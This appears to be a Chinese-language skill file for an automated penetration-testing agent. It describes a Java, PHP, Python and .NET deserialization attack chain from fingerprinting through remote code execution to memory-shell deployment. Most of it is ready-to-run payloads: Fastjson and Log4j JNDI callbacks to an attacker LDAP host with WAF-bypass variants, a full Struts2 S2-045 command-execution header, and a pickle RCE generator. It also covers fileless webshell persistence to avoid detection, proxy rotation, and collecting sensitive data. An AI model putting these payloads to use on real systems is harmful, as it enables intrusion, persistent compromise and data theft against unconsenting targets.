---
name: deserialization-rce
description: Deserialization attack chain from framework fingerprinting through gadget chain construction to RCE and memory shell deployment
version: 1.0.0
---

# 反序列化攻击链

## 适用场景

发现疑似反序列化入口后加载。覆盖入口识别 → 框架指纹 → gadget 链构造 → RCE → 内存马部署完整链。目标框架: Java (Fastjson / Shiro / Log4j / Struts / WebLogic / JBoss / Spring) / PHP (unserialize / phar) / Python (pickle / yaml) / .NET (BinaryFormatter / ViewState)。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 攻击链

### 1) 反序列化入口识别

特征信号:
- Java: 请求体含 `rO0AB` (Base64) 或 `aced0005` (Hex) 前缀;Content-Type 含 `application/x-java-serialized-object`;Cookie 含 `rememberMe=` (Shiro)
- PHP: 参数含 `O:4:"User"` 格式;`phar://` 协议触发点
- Python: 参数含 `\x80\x04\x95` 前缀 (pickle);YAML `!!python/object`
- .NET: `__VIEWSTATE` 参数;`AAEAAAD/////` (Base64) 前缀

```bash
# Shiro rememberMe 检测
curl -sk https://TARGET -H "Cookie: rememberMe=1" -D - | grep "deleteMe"

# Fastjson 检测 (报错触发)
curl -sk https://TARGET/api -H "Content-Type: application/json" -d '{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}'

# Log4j 检测
curl -sk https://TARGET -H "X-Forwarded-For: \${jndi:ldap://DNSLOG/test}"
curl -sk https://TARGET -H "User-Agent: \${jndi:ldap://DNSLOG/test}"

# WebLogic T3 协议检测
nmap -sT -p 7001 TARGET --script weblogic-t3-info

# nuclei 反序列化模板
nuclei -u https://TARGET -tags deserialization,java,shiro,fastjson,log4j,struts -silent

# 代理版
nuclei -u https://TARGET -tags deserialization -silent -proxy http://<PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:1000
```

### 2) 框架指纹

```bash
# 通过响应头/指纹识别
curl -sI https://TARGET | grep -iE 'x-powered-by|server|x-application-context|x-oc-|weblogic|jboss|tomcat|spring|struts'

# Shiro 版本判断 (Cookie key 长度)
# rememberMe cookie → Base64 → AES → 序列化数据

# Fastjson 版本 (报错信息)
curl -sk https://TARGET/api -H "Content-Type: application/json" -d '{"a":{"@type":"java.lang.AutoCloseable"' 2>&1

# Spring Boot Actuator
curl -sk https://TARGET/actuator/env
curl -sk https://TARGET/actuator/beans
```

### 3) gadget 链构造 + RCE

#### Shiro

```bash
# Shiro 默认 Key 检测 + 利用
# 常见默认 Key: kPH+bIxk5D2deZiIxcaaaA== (CBC) / 4AvVhmFLUs0KTA3Kprsdag==
# 工具: ShiroExploit / ysoserial

# 手工构造 (伪代码): AES-CBC(serialize(gadget_chain), key, iv)
# 常见 gadget: CommonsBeanutils1 / CommonsCollections系列

# nuclei Shiro 扫描
nuclei -u https://TARGET -tags shiro -silent
```

#### Fastjson

```bash
# Fastjson RCE payload (1.2.24-)
curl -sk https://TARGET/api -H "Content-Type: application/json" -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}'

# Fastjson 高版本绕过 (1.2.47)
curl -sk https://TARGET/api -H "Content-Type: application/json" -d '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER:1389/Exploit","autoCommit":true}}'
```

#### Log4j (CVE-2021-44228)

```bash
# JNDI 注入
curl -sk https://TARGET -H "X-Api-Version: \${jndi:ldap://ATTACKER:1389/Exploit}"
curl -sk https://TARGET -H "User-Agent: \${jndi:ldap://ATTACKER:1389/Exploit}"

# WAF 绕过变体
curl -sk https://TARGET -H "User-Agent: \${j\${::-n}di:l\${::-d}ap://ATTACKER:1389/Exploit}"
curl -sk https://TARGET -H "User-Agent: \${jndi:\${lower:l}\${lower:d}ap://ATTACKER:1389/Exploit}"
curl -sk https://TARGET -H "User-Agent: \${\${env:BARFOO:-j}ndi\${env:BARFOO:-:}\${env:BARFOO:-l}dap\${env:BARFOO:-:}//ATTACKER:1389/Exploit}"
```

#### WebLogic

```bash
# T3 协议反序列化
# CVE-2023-21839 / CVE-2020-14882
nuclei -u https://TARGET:7001 -tags weblogic -silent

# IIOP 协议
# CVE-2020-2551
```

#### Struts2

```bash
# S2-045 / S2-046 / S2-048 / S2-057 / S2-061
nuclei -u https://TARGET -tags struts -silent

# S2-045 手工
curl -sk https://TARGET -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

#### PHP 反序列化

```bash
# unserialize 入口
curl -sk "https://TARGET/page?data=O:4:%22User%22:1:{s:4:%22name%22;s:4:%22test%22;}"

# phar 反序列化
# 上传恶意 phar 文件,通过 file_exists/is_dir/fopen 等函数触发
curl -sk "https://TARGET/check?file=phar:///uploads/evil.phar/test.txt"
```

#### Python pickle

```bash
# pickle RCE payload (base64)
python3 -c "
import pickle,base64,os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
# 将输出注入到目标参数
```

### 4) 内存马部署

RCE 成功后,Java 环境部署内存马 (Filter/Servlet/Listener 型):
- 避免文件落地,降低检测风险
- 通过反序列化链注入内存马 class
- 支持冰蝎 / 哥斯拉 / 蚁剑协议

### 5) 接入 RCE 后利用链

内存马 / webshell 成功后,完整接入 rce-post-exploitation skill。

## WAF 对抗集成

### 反序列化 payload WAF 绕过

```bash
# Base64 编码 payload 通常不被 WAF 解码检测
# Fastjson: 利用 Unicode 编码 @type
curl -sk https://TARGET/api -H "Content-Type: application/json" -d '{"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl"}'

# Log4j: 嵌套表达式绕过 WAF 关键字检测
# ${j${::-n}di:l${::-d}ap://...}

# 代理版
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 https://TARGET/api -H "Content-Type: application/json" -d '{"@type":"..."}'
```

## 代理池启用判定

- WAF 拦截反序列化 payload → 走代理 + payload 编码绕过
- JNDI/LDAP 回连阶段 → 目标服务器主动外连,无需代理
- 内存马 / 后利用阶段 → 按 rce-post-exploitation 规则

## 敏感数据采集点

- 系统类: 框架版本 / 中间件版本 / JDK 版本 / gadget 链信息
- 凭据类: RCE 后等同 rce-post-exploitation 采集范围

## 失败处理

1. 默认 Key 不匹配 (Shiro) → 枚举常见 Key 列表 (100+ 已知泄露 Key)
2. gadget 链不可用 → 切换 gadget (CC1→CC2→CC3→CB1→JDK7u21...)
3. JNDI 不出网 → 用本地 gadget / 不出网利用链
4. WAF 拦截序列化数据 → 编码绕过 / chunked 传输
5. 版本过高修复 → 尝试其他入口 / 放弃转其他漏洞类型

## 报告必填字段

- 漏洞标题 / 漏洞指纹 / 完整 PoC
- WAF 类型 + 绕过路径
- 框架 + 版本
- 使用的 gadget 链
- RCE 证据
- 内存马部署情况
- 后利用结果 / 敏感数据清单
- 影响半径 / CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 是否完成了框架指纹识别?
2. RCE 成功后是否接入了完整后利用链?
3. 是否评估了内存马部署可行性?
